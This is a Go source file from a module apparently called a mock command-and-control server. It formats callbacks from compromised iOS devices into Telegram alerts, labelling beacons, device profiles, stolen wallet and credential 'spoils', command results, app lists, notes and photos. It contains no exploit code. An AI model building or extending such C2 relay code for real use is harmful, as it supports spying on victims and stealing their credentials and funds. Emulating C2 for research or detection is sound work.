package telegram

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"mockc2/internal/store"
)

// notifyItem 一条待推送的回传事件（观察者入队，发送 worker 消费）。
type notifyItem struct {
	ep   string
	rel  string
	size int
	raw  []byte
	ts   time.Time
}

var epLabel = map[string]string{
	"beacon":    "beacon 上线",
	"a":         "设备档案",
	"sync":      "入口登记",
	"war":       "钱包/凭据战果",
	"result":    "命令执行结果",
	"u":         "应用清单",
	"nb":        "备忘录",
	"ph":        "照片",
	"p":         "照片",
	"event":     "事件上报",
	"heartbeat": "pe 流水线完成",
	"wallet":    "钱包回传",
}

// formatNotify 把回传事件格式化为可读文本（纯文本，无 Markdown/HTML 转义风险）。
func formatNotify(it notifyItem) string {
	label := epLabel[it.ep]
	if label == "" {
		label = it.ep
	}
	var b strings.Builder
	fmt.Fprintf(&b, "🔔 %s\n", label)
	fmt.Fprintf(&b, "文件: %s (%s)\n", baseName(it.rel), humanSize(it.size))
	fmt.Fprintf(&b, "时间: %s\n", it.ts.Format("2006-01-02 15:04:05"))

	var o map[string]any
	if json.Unmarshal(it.raw, &o) == nil {
		switch it.ep {
		case "beacon":
			di, _ := o["device_info"].(map[string]any)
			appendKV(&b, "uuid", o["uuid"])
			appendKV(&b, "机型", di["machine"])
			appendKV(&b, "iOS", di["ios_version"])
			appendKV(&b, "状态", o["status"])
		case "a":
			appendKV(&b, "uuid", o["uuid"])
			appendKV(&b, "主机名", o["hostname"])
			appendKV(&b, "机型", o["machine"])
		case "war":
			appendKV(&b, "设备", o["device_uuid"])
			appendKV(&b, "probe", o["probe"])
		case "result":
			appendKV(&b, "command_id", o["command_id"])
			appendKV(&b, "status", o["status"])
		case "u":
			appendKV(&b, "lhu", o["lhu"])
			if arr, ok := o["apps"].([]any); ok {
				fmt.Fprintf(&b, "应用数: %d\n", len(arr))
			}
		case "nb":
			appendKV(&b, "lhu", o["lhu"])
			if arr, ok := o["list"].([]any); ok {
				fmt.Fprintf(&b, "备忘条数: %d\n", len(arr))
			}
		case "p", "ph":
			appendKV(&b, "device", o["device_uuid"])
		}
	}
	return strings.TrimRight(b.String(), "\n")
}

func appendKV(b *strings.Builder, k string, v any) {
	s := store.ToStr(v)
	if s == "" {
		return
	}
	fmt.Fprintf(b, "%s: %s\n", k, s)
}

func baseName(p string) string {
	if i := strings.LastIndexByte(p, '/'); i >= 0 {
		return p[i+1:]
	}
	return p
}

func humanSize(n int) string {
	if n < 1024 {
		return fmt.Sprintf("%d B", n)
	}
	units := []string{"KB", "MB", "GB"}
	v := float64(n) / 1024
	i := 0
	for v >= 1024 && i < len(units)-1 {
		v /= 1024
		i++
	}
	if v < 10 {
		return fmt.Sprintf("%.2f %s", v, units[i])
	}
	return fmt.Sprintf("%.1f %s", v, units[i])
}
